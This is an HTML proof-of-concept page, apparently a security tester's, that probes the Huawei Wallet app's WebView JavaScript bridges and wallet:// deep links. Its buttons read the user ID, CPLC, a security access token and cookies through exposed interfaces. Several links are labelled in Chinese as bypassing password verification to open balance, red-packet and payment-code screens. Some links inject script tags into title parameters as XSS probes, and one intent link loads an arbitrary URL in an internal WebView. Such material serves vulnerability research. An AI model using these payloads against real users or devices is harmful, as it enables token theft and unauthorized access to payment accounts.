<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Test wallet js interface</title>
</head>
<body>

<div>

    <input type="button" value="getJSObject" onclick="getJSObject()"
           style="width: 400px; height: 40px; font-size:30px"/>
    </br>

    <input type="button" value="getEmuiVersion" onclick="getEmuiVersion()"
           style="width: 400px; height: 40px; font-size:30px"/>
    </br>
    <input type="button" value="getCplc" onclick="getCplc()" style="width: 400px; height: 40px; font-size:30px"/>
    </br>
    <input type="button" value="getUserId" onclick="getUserId()" style="width: 400px; height: 40px; font-size:30px"/>
    </br>

    <input type="button" value="getSecurityAccessToken" onclick="getSecurityAccessToken()"
           style="width: 400px; height: 40px; font-size:30px"/>
    </br>

    <input type="button" value="getCookie" onclick="getCookie()"
           style="width: 400px; height: 40px; font-size:30px"/>
    </br>


    <a href="wallet://com.huawei.wallet/openwallet?action=com.huawei.wallet.paychange.action.FINANCE_TRADE" font-size:30px >绕过密码验证，打开零钱汇明细</a>
    </br>

    <a href="wallet://com.huawei.wallet/openwallet?action=com.huawei.wallet.paychange.action.TRADE&index=200" font-size:30px >绕过密码验证，打开零钱明细</a>
    </br>    
    <a href="wallet://com.huawei.wallet/openwallet?action=com.huawei.wallet.paychange.openpage&index=0&goal=RedPackage&source=cc" font-size:30px >绕过密码验证，打开我的红包界面</a>
    </br>
    <a href="wallet://com.huawei.wallet/openwallet?action=com.huawei.wallet.paychange.openpage&goal=PayChange_H5&source=cc&title=<scirpt>alert('cc')</script>&url=https://contentcenter-drcn.dbankcdn.com/cch5/huaweipaycdn/vipCard_walmartGiftCardtest/index.html" font-size:30px >打开H5页面</a>
    </br>
	
    <a href="wallet://com.huawei.wallet/openwallet?action=com.huawei.wallet.paychange.openpage&index=0&goal=ZeroBuy" font-size:30px >0元购</a>
    </br>	
    <a href="wallet://com.huawei.wallet/openwallet?action=com.huawei.wallet.paychange.openpage&index=0&goal=OpenAccount" font-size:30px >OpenAccount</a>
    </br>

    <a href="wallet://com.huawei.wallet/openwallet?action=com.huawei.wallet.paychange.openpage&index=0&goal=ActiveAccount" font-size:30px >更新账户</a>
    </br>
	
    <a href="wallet://com.huawei.wallet/openwallet?action=com.huawei.wallet.paychange.openpage&index=0&goal=finance" font-size:30px >finance</a>
    </br>
	

    <a href="wallet://com.huawei.wallet/openwallet?action=com.huawei.wallet.paychange.openpage&index=0&goal=BenefitRecharge" font-size:30px >BenefitRecharge</a>
    </br>
	
    <a href="wallet://com.huawei.wallet/openwallet?action=com.huawei.wallet.paychange.openpage&index=0&goal=DepositUnsign" font-size:30px >DepositUnsign</a>
    </br>
	
    <a href="wallet://com.huawei.wallet/openwallet?action=com.huawei.wallet.paychange.openpage&index=0&goal=DepositSigned" font-size:30px >DepositSigned</a>
    </br>
	
    <a href="wallet://com.huawei.wallet/openwallet?action=com.huawei.wallet.paychange.openpage&index=0&goal=Deposit" font-size:30px >Deposit</a>
    </br>	
	
    <a href="wallet://com.huawei.wallet/openwallet?action=com.huawei.wallet.paychange.openpage&index=0&goal=AccountUpgrade" font-size:30px >AccountUpgrade</a>
    </br>
	
    <a href="wallet://com.huawei.wallet/openwallet?action=com.huawei.wallet.paychange.openpage&index=0&goal=MainPage" font-size:30px >绕过密码验证，打开零钱主页面（已修复）</a>
    </br>

    <a href="wallet://com.huawei.wallet/openwallet?action=com.huawei.wallet.intent.action.PAYMENTCODE&jumpSource=swing&isFromWallet=0&type=2" font-size:30px >打开付款码type2</a>
    </br>
    
    <a href="wallet://com.huawei.wallet/openwallet?action=com.huawei.wallet.intent.action.PAYMENTCODE&jumpSource=swing&isFromWallet=0&type=1" font-size:30px >打开付款码type1</a>
    </br>
    
    <a href="wallet://com.huawei.wallet/openwallet?action=com.huawei.wallet.intent.action.PAYMENTCODE&jumpSource=swing&isFromWallet=0&type=0" font-size:30px >打开付款码type0</a>
    </br>

    <a href="wallet://com.huawei.wallet/openwallet?action=com.huawei.wallet.intent.action.PAYMENTCODE&jumpSource=swing&isFromWallet=0&type=3" font-size:30px >打开付款码type3</a>
    </br>

    <a href="intent://com.huawei.wallet/thirdappbind#Intent;package=com.huawei.wallet;component=com.huawei.wallet/com.huawei.pay.ui.setting.WebViewActivity;S.intent_bundle_url=https%3A%2F%2Fwww.baidu.com;scheme=financeclient;end" font-size:30px >绑卡</a>
    </br>

    <a href="wallet://com.huawei.wallet/openwallet?action=com.huawei.wallet.membership.action.WALMART&jumpsource=other&type=walmart&passType=hwpass.huawei.smkt.pass.walmart&url=https://contentcenter-drcn.dbankcdn.com/cch5/huaweipaycdn/vipCard_walmartGiftCardtest/index.html" font-size:30px >沃尔玛礼品卡购买</a>
    </br>
	
	
    <a href="wallet://com.huawei.wallet/openwallet?action=com.huawei.nfc.intent.action.AWARDS&url=https://contentcenter-drcn.dbankcdn.com/cch5/huaweipaycdn/common_offers904/detail.html?id=hwpApp&title=<script>alert('cc')</script>" font-size:30px >AWARDS推广页面</a>
    </br>
	
	<a href="wallet://com.huawei.wallet/openwallet?action=com.huawei.wallet.paychange.openpage&index=0&goal=PayChange_H5&title=cc&url=https://contentcenter-drcn.dbankcdn.com/cch5/huaweipaycdn/vipCard_walmartGiftCardtest/index.html" font-size:30px >openpage零钱页面</a>
    </br>
	
	<a href="wallet://com.huawei.wallet/openwallet?action=com.huawei.wallet.intent.action.INVITED&&title=cc&url=https://h5hosting-drcn.dbankcdn.cn/cch5/huaweipaycdn/actions_jan21_hwcInterviewed/index.html" font-size:30px >INVITED邀请有礼页面</a>
    </br>
	
	<a href="wallet://com.huawei.wallet/openwallet?action=com.huawei.wallet.intent.action.TOURIST_PROMOTION&&title=cc&url=https://hwdeveloper.wjx.cn/jq/100587066.aspx" font-size:30px >TOURIST_PROMOTION</a>
    </br>
	
	
</div>
<script>

    //function gotowhite(){
    //    top.location.href = "https://h5-drcn.wallet.dbankcloud.com/sandbox/cch5/huaweipay/marketActions_oct20_balanceCGB/";
    //}

    //setInterval(gotowhite,5);
    //setTimeout(getSecurityAccessToken,3000);


    try {
        getWindowWalletJSObj('wallet');
    } catch (err) {
    }

    function getJSObject() {
        alert('all JSObject : \n' + getWindowWalletJSObj('wallet'));
    }

    function getEmuiVersion() {
        if (getWindowObjName('walletBasicInfoJSInterface')) {
            alert('getEmuiVersion is : ' + window.walletBasicInfoJSInterface.getEmuiVersion());
        } else {
            alert('not has walletBasicInfoJSInterface');
        }
    }

    function getCplc() {
        if (getWindowObjName('walletBasicInfoJSInterface')) {
            alert('getCplc is : ' + window.walletBasicInfoJSInterface.getCplc());
        } else {
            alert('not has walletBasicInfoJSInterface');
        }
    }

    function getUserId() {
        if (getWindowObjName('walletAccountInfoJsInterface')) {
            alert('getUserId is : ' + window.walletAccountInfoJsInterface.getUserId());
        } else {
            alert('not has walletAccountInfoJsInterface');
        }
    }

    function getSecurityAccessToken() {
        if (getWindowObjName('walletTokenInfoJsInterface')) {
            alert('getSecurityAccessToken is : ' + window.walletTokenInfoJsInterface.getSecurityAccessToken());
        } else {
            alert('not has walletTokenInfoJsInterface');
        }
    }

    function getCookie() {
        alert("cookie : " +document.cookie);
    }
    
    /**
     * 判断JSObject是否存在
     */
    function getWindowObjName(jsname) {
        return Object.keys(window).indexOf(jsname) !== -1;
    }

    /**
     * 获取window中包含wallet的JSObject
     */
    function getWindowWalletJSObj(name) {
        var walletJsObj = '';
        var all = Object.keys(window);
        for (var obj in all) {
            if (all[obj].indexOf(name) !== -1 || all[obj].indexOf('actionUtil') !== -1) {
                walletJsObj += all[obj];
                walletJsObj += "\n";
            }
        }
        alert(walletJsObj);
        return walletJsObj;
    }
</script>
</body>
</html>
